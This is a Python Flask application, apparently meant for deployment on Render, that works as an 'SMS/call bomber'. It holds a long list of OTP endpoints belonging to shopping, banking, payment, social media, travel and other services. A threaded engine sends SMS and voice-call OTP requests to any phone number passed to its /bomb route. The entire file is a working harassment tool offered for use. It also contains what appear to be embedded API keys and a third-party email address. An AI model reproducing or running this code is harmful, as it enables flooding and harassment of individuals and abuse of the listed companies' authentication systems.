# ============================================
#  😈 200+ API BOMBER - RENDER DEPLOYMENT
# File: main.py
# ============================================

from flask import Flask, request, jsonify
import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import os

app = Flask(__name__)

# ============================================
# 200+ API LIST (COMPLETE)
# ============================================
API_LIST = [
    # AMAZON & E-COMMERCE
    {
        "name": "Amazon SMS OTP",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=otp"
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Flipkart SMS OTP",
        "url": "https://www.flipkart.com/api/6/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra SMS OTP",
        "url": "https://www.myntra.com/gw/mobile-auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Ajio OTP",
        "url": "https://www.ajio.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "Nykaa OTP",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    
    # FOOD DELIVERY
    {
        "name": "Swiggy SMS OTP",
        "url": "https://www.swiggy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Swiggy Voice Call",
        "url": "https://www.swiggy.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Zomato SMS OTP",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=otp"
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "BigBasket SMS OTP",
        "url": "https://www.bigbasket.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BigBasket Voice Call",
        "url": "https://www.bigbasket.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zepto OTP",
        "url": "https://www.zepto.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Blinkit OTP",
        "url": "https://www.blinkit.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # PAYMENT & BANKING
    {
        "name": "Paytm SMS OTP",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "PhonePe SMS OTP",
        "url": "https://www.phonepe.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PhonePe Voice Call",
        "url": "https://www.phonepe.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google Pay OTP",
        "url": "https://pay.google.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google Voice OTP",
        "url": "https://accounts.google.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BHIM OTP",
        "url": "https://www.bhim.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "MobiKwik OTP",
        "url": "https://www.mobikwik.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "SBI YONO OTP",
        "url": "https://yonosbi.sbi.co.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "HDFC NetBanking OTP",
        "url": "https://netbanking.hdfcbank.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "ICICI iMobile OTP",
        "url": "https://www.icicibank.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Kotak OTP",
        "url": "https://www.kotak.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Yes Bank OTP",
        "url": "https://www.yesbank.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # SOCIAL MEDIA
    {
        "name": "Facebook OTP",
        "url": "https://www.facebook.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Instagram OTP",
        "url": "https://www.instagram.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "WhatsApp OTP",
        "url": "https://www.whatsapp.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Telegram OTP",
        "url": "https://api.telegram.org/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Twitter OTP",
        "url": "https://api.twitter.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "LinkedIn OTP",
        "url": "https://www.linkedin.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # ENTERTAINMENT
    {
        "name": "Netflix OTP",
        "url": "https://www.netflix.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Amazon Prime OTP",
        "url": "https://www.primevideo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hotstar OTP",
        "url": "https://www.hotstar.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "SonyLiv OTP",
        "url": "https://www.sonyliv.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zee5 OTP",
        "url": "https://www.zee5.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Jio Cinema OTP",
        "url": "https://www.jiocinema.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Spotify OTP",
        "url": "https://www.spotify.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Gaana OTP",
        "url": "https://www.gaana.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "JioSaavn OTP",
        "url": "https://www.jiosaavn.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # TRAVEL & BOOKING
    {
        "name": "MakeMyTrip SMS OTP",
        "url": "https://www.makemytrip.com/api/4/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo SMS OTP",
        "url": "https://www.goibibo.com/user/otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "IRCTC OTP",
        "url": "https://www.irctc.co.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "IRCTC Voice Call",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "RedBus OTP",
        "url": "https://www.redbus.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola SMS OTP",
        "url": "https://api.olacabs.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber OTP",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice OTP",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BookMyShow SMS OTP",
        "url": "https://in.bookmyshow.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BookMyShow Voice Call",
        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # TELECOM
    {
        "name": "Airtel Thanks OTP",
        "url": "https://www.airtel.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Jio OTP",
        "url": "https://www.jio.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Vi OTP",
        "url": "https://www.myvi.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # REAL ESTATE
    {
        "name": "NoBroker OTP",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "99acres OTP",
        "url": "https://www.99acres.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Magicbricks OTP",
        "url": "https://www.magicbricks.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # HEALTH & PHARMA
    {
        "name": "PharmEasy OTP",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Netmeds OTP",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "1MG OTP",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":false}}'
    },
    {
        "name": "Practo OTP",
        "url": "https://www.practo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # EDUCATION
    {
        "name": "Byju's OTP",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Unacademy OTP",
        "url": "https://unacademy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Vedantu OTP",
        "url": "https://www.vedantu.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Doubtnut OTP",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "UpGrad OTP",
        "url": "https://www.upgrad.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Coursera OTP",
        "url": "https://www.coursera.org/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # JOB & FREELANCE
    {
        "name": "Naukri OTP",
        "url": "https://www.naukri.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Indeed OTP",
        "url": "https://www.indeed.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Upwork OTP",
        "url": "https://www.upwork.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Fiverr OTP",
        "url": "https://www.fiverr.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Freelancer OTP",
        "url": "https://www.freelancer.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # BOMBER.PY SPECIAL APIS
    {
        "name": "Lenskart OTP",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Country-Code": "IN"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Pink Cabs OTP",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroo OTP",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "KPN Fresh OTP",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "name": "BikeFixup OTP",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client": "app"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Rappi WhatsApp OTP",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "name": "Stratzy OTP",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "identifier": "home"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}}'
    },
    {
        "name": "Meru Cabs OTP",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "DeviceType": "Android"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Beepkart OTP",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"city":362,"phone":"{phone}","source":"myaccount"}}'
    },
    {
        "name": "Snitch OTP",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Shiprocket OTP",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik OTP",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6jlc658iad"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "Foxy OTP",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}}}}'
    },
    {
        "name": "Eka Care OTP",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Client-Id": "androidp"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Smytten OTP",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"
        },
        "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "name": "Wakefit OTP",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "name": "CaratLane OTP",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
    },
]

# ============================================
# BOMBER ENGINE
# ============================================
class DemonBomber:
    def __init__(self, phone, threads=10, delay=2):
        self.phone = phone
        self.threads = threads
        self.delay = delay
        self.results = []
        self.success = 0
        self.failed = 0

    def hit_api(self, api):
        try:
            # Handle dynamic URL
            url = api.get('url')
            if not url and api.get('dynamic_url'):
                url = api['dynamic_url'](self.phone)
            if not url:
                return {'name': api['name'], 'status': 'error'}

            # Prepare data
            data = None
            if api.get('data'):
                data = api['data'](self.phone) if callable(api['data']) else api['data']

            # Headers
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'

            # Request
            method = api.get('method', 'POST').upper()
            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            else:
                if 'json' in headers.get('Content-Type', ''):
                    response = requests.post(url, json=json.loads(data), headers=headers, timeout=10)
                else:
                    response = requests.post(url, data=data, headers=headers, timeout=10)

            status = 'success' if response.status_code in [200, 201, 202, 204] else 'failed'
            if status == 'success':
                self.success += 1
            else:
                self.failed += 1

            return {'name': api['name'], 'status': status, 'code': response.status_code}

        except Exception as e:
            self.failed += 1
            return {'name': api['name'], 'status': 'error', 'error': str(e)[:50]}

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.hit_api, api): api for api in API_LIST}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)
                    # Add delay between requests
                    time.sleep(self.delay / 1000)  # Convert to seconds
                except Exception as e:
                    pass

        return {
            'total': len(API_LIST),
            'success': self.success,
            'failed': self.failed,
            'results': self.results[:10]  # Return first 10 results
        }

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def home():
    return jsonify({
        'status': 'online',
        'name': 'DEMON 😈 200+ API Bomber',
        'version': '3.0',
        'total_apis': len(API_LIST),
        'endpoints': {
            '/bomb?phone=XXXXXXXXXX': 'Start bombing',
            '/status': 'Check status',
            '/stats': 'Get stats'
        }
    })

@app.route('/status')
def status():
    return jsonify({
        'status': 'active',
        'total_apis': len(API_LIST),
        'uptime': 'Running'
    })

@app.route('/stats')
def stats():
    sms = len([a for a in API_LIST if 'voice' not in a['name'].lower()])
    call = len([a for a in API_LIST if 'voice' in a['name'].lower()])
    return jsonify({
        'total_apis': len(API_LIST),
        'sms_apis': sms,
        'call_apis': call,
        'threads_per_cycle': 10
    })

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    try:
        if request.method == 'GET':
            phone = request.args.get('phone')
            threads = int(request.args.get('threads', 10))
            delay = int(request.args.get('delay', 2))
        else:
            data = request.get_json() or {}
            phone = data.get('phone')
            threads = int(data.get('threads', 10))
            delay = int(data.get('delay', 2))

        if not phone:
            return jsonify({'error': 'Phone number required'}), 400

        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) < 10:
            return jsonify({'error': 'Invalid phone number'}), 400

        # Run bomber
        bomber = DemonBomber(phone, threads=min(threads, 10), delay=min(delay, 5))
        result = bomber.run()

        return jsonify({
            'status': 'completed',
            'phone': phone,
            'summary': result
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================
# MAIN - RENDER DEPLOYMENT
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[Nischay] Starting on port {port}")
    print(f"[Nischay] Total APIs: {len(API_LIST)}")
    app.run(host='0.0.0.0', port=port, debug=False)
